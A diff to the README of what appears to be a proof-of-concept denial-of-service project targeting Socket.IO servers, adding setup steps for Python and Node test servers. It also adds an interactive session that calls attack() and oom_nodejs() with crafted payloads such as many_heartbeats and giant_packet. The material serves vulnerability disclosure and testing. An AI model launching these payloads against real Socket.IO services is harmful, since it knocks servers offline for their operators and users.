@@ -74,12 +74,47 @@ With `many_heartbeats` (`1:21:21:21:21:21:21:21:21:2...`), each ping causes the 
 
 ## Run
 
-Start test server with `python serve.py` or `python serve.py 2>/dev/null`.
-Send payload using code in kill_socket_io.py.
-With eventlet (just `pip install eventlet`), a single payload appears to DoS the entire server until processing completes.
+### Test server
+
+#### Python
+
+```bash
+python3.7 -m venv .env || virtualenv -p `which python3` .env
+.env/bin/activate
+pip install Flask-SocketIO
+# pip install eventlet  # Optional
+python serve.py 2>/dev/null
+```
+With eventlet, a single payload appears to DoS the entire server until processing completes.
 Without eventlet, the non-production server remains responsive until the thread pool is exhausted as it launches actual threads.
 
-For nodejs, install `npm install socket.io` and run `node serve.js` or `DEBUG=socket.io* node serve.js`. Use the python `kill_socket_io.py` as above to send the payloads.
+#### Node
+
+```bash
+npm install socket.io
+node serve.js
+# DEBUG=socket.io* node serve.js  # as an alternative
+```
+
+### Send payload
+
+Send payload using code in kill_socket_io.py.
+
+```bash
+python3.7 -m venv .env || virtualenv -p `which python3` .env
+.env/bin/activate
+pip install requests
+python -i kill_socket_io.py  # Start interactive session
+```
+Within the interactive console you can run commands like:
+```python
+x()  # Just saves typing!
+attack('http://127.0.0.1:5000', make_payload=many_tiny_packets)
+oom_nodejs()
+oom_nodejs(make_payload=many_heartbeats)
+oom_nodejs(make_payload=giant_packet)
+```
+Of course, you can instead do `python -c 'import kill_socket_io as ksi; ksi.x()'`.
 
 ## Survival
 
